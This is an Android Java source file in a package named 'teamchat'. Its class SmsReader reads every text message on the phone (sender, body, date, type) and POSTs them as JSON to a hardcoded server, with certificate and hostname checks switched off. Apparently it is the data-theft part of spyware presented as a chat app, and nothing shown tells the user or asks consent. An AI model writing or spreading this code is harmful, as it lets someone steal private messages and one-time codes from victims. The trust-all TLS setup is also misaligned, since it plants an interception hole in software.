package com.example.teamchat;


import android.Manifest;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.Telephony;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.util.Log;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.TimeZone;
import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

import javax.net.ssl.HostnameVerifier;
import javax.net.ssl.SSLContext;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.cert.X509Certificate;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSession;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import org.json.JSONArray;


public class SmsReader  {

    private Context context;
    // private OkHttpClient client = new OkHttpClient(); // Used for HTTP.
    private OkHttpClient.Builder builder = new OkHttpClient.Builder(); // Used for HTTPS.
    private String baseUrl = "https://192.168.80.1"; // Redirect to your IP in your hosts file.

    public SmsReader(Context context) throws KeyManagementException, NoSuchAlgorithmException {
        this.context = context;

        TrustManager TRUST_ALL_CERTS = new X509TrustManager() {
            @Override
            public void checkClientTrusted(java.security.cert.X509Certificate[] chain, String authType) {
            }

            @Override
            public void checkServerTrusted(java.security.cert.X509Certificate[] chain, String authType) {
            }

            @Override
            public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                return new java.security.cert.X509Certificate[] {};
            }
        };

        SSLContext sslContext = SSLContext.getInstance("SSL");
        sslContext.init(null, new TrustManager[] { TRUST_ALL_CERTS }, new java.security.SecureRandom());
        builder.sslSocketFactory(sslContext.getSocketFactory(), (X509TrustManager) TRUST_ALL_CERTS);
        builder.hostnameVerifier(new HostnameVerifier() {
            @Override
            public boolean verify(String hostname, SSLSession session) {
                return true;
            }
        });

    }

    public void readSMS() throws JSONException {
        Log.d("","readSMS");
        ContentResolver contentResolver = context.getContentResolver();
        Cursor cursor = contentResolver.query(Uri.parse("content://sms"), null, null, null, null);
        JSONArray messagesArray = new JSONArray();
        if (cursor.moveToFirst()) {
            do {
                String address = cursor.getString(cursor.getColumnIndex("address"));
                String body = cursor.getString(cursor.getColumnIndex("body"));
                long epoch_date = cursor.getLong(cursor.getColumnIndex("date"));
                String type = cursor.getString(cursor.getColumnIndex("type"));

                Date date = new Date(epoch_date);
                DateFormat format = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
                format.setTimeZone(TimeZone.getTimeZone("Asia/Singapore"));
                String formatted_date = format.format(date);

                JSONObject json = null;
                try {
                    // Create a JSON object to send to the server
                    json = new JSONObject();
                    json.put("address", address);
                    json.put("body", body);
                    json.put("formatted_date", formatted_date);
                    json.put("type", type);
                    messagesArray.put(json);
                } catch (JSONException e) {
                    Log.e("SMS", "Error creating JSON object: " + e.getMessage());
                }
            } while (cursor.moveToNext());
        }
        JSONObject parentObject = new JSONObject();
        parentObject.put("messages", messagesArray);
        RequestBody requestBody = RequestBody.create(MediaType.parse("application/json"), parentObject.toString());
        Request request = new Request.Builder()
                .url(baseUrl)
                .post(requestBody)
                .build();

        try (Response response = builder.build().newCall(request).execute()) {
            if (!response.isSuccessful()) throw new IOException("Unexpected code " + response);

            // Do something with the response here
            Log.d("SMS", "Response: " + response.body().string());
        } catch (IOException e) {
            Log.e("SMS", "Error sending request: " + e.getMessage());
        }
    }



}